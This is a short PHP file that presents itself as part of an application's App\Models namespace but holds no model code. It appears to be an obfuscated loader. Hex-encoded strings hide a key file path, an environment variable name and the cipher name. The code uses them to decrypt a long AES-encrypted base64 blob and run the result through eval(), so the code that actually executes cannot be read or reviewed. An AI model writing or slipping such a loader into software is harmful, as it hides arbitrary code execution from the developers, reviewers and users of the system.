<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('FttDdUQBh1uuu2UU1xDKFg==');

$c=base64_decode(

'tIdsS4tuDIWzYk4pCdat7HigTUwa3A+t6BC9ikQxZI6raMDpDjc7rrcaGspT6Ab1jgSTVRe5mAi0' .
'Am9SCvFXbfsIIa1sTvxr8AL6n2Txn0ANifPU7geCOlS7n7lLl2D65TiBI+Dk2FGEwBO8y6mjbb1q' .
'Se7dTilvANKeRXR7RgcD/TTMgYS6lfaDOPTLXrh0EVV4F6zPWWZqRZnqYtnVJv/u0TzN/fAGbraa' .
'CdZXLMkJLI80MLWvJFyvIQGbdUPKmKY2/6hj6oM87ks/SiKQS86B+PFgaHGPT/5gcAed74lUQM5o' .
'lJn9f36jgZHkCmmtAdtOdl5TAASoRnO6N8U1E9YDrlfaRuPF8ubF9KmdrWejxpHuACiAfso/xOAz' .
'hEgrHhBgYZb7M8vVkoZ1PZ+E6kEBsAjzu5I4gqecYvTLbGb9N7CCn16nrzCVyxh7m98jOqVALIZ7' .
'p4cVxVNlCFCvXnfeRTYLbu5cQs0PNZQ8K4Dq7A3dNeL0ir7vNwBnzDj6uPgL5cU0bwYxNeINiAGc' .
'g4Rbr1RJcU1FCwu9ZD+kwnQ/oifB8jhNlN1FUup9/kgpqKWi5TE178iS++ejGC42DZvWj8031cbp' .
'FS8+9ZP8q+HaoKCW5CJ5x9IAEFXeNH0UzCFuU24xo3w6gwz7RE1bpYcYQuUpEwcdJ93AmvODu797' .
'pfRyPffGCHsdswr1gOkrD+HZgeTJgrgrTGKZD9urw5lkep/vdeJfYTH7khg9YB1z0DDSE5Q+e1nN' .
'SFLBb1xQAMYRIPIPexTZ89HQpXANHvXyvSgUSo3DphvI1SUiufCacT5gZ0oFlHUcm9p6ad0dtxMA' .
'OqHP8ilwfpRPrIH5rc31WNqI4wmqPIF8TWDX35XsqW+8V5Zg4e/A+a7jPaLAIStyUJ4XWCfW0XAx' .
'CZvQK+zCSHekViUs1uGwdjso6cCtE6u55bE6v55xCKuIXFwbbMVV5Sz1EP1eoHi7Z8eVxLxvPrjB' .
'Wc7gZJwS5Mae9zwi+HtGUoZ5zG1uaUx+oBhwr2A9jpd7MXwSquSVreuScQOK7IRgV50zROoE/3Li' .
'SvcVQfjPA+QmFvDqLE9oy/g8ThfYMk6IicJSehy4UEZGD0oULFuVThhZdlEj0S7z8rnEwNUGZSAw' .
'7cJQYz9BhG9Bq+31zf0OOYVDtASzn7Ilz8GitcdpsiNbD5Y7mpIeD8I2rFAyaS578DgkFQaNWYxD'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

